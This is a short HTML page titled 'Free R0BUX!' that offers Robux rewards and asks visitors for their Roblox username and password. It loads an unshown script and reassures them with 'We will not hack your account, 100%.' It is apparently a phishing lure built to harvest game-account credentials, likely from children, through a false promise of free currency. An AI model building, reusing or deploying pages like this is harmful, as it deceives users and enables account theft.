<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Free R0BUX!</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <h1>REWARDS</h1>


        <select id="rewardList" class="neon-select">
            <option>1000 Robux</option>
            <option>10,000</option>
            <option>100,000, FAMOUS!</option>
        </select>

        <button id="submitBtn" class="neon-button">SUBMIT</button>

        <label>Username!</label>
        <input type="text" class="textbox">

        <label>Password!</label>
        <input type="Password!" class="textbox">
    </div>

    <script src="script.js"></script>

<p class="desc">⭐We will not hack your account, 100%.⭐</p>

<div id="notification" class="notification hidden"></div>

</body>
</html>
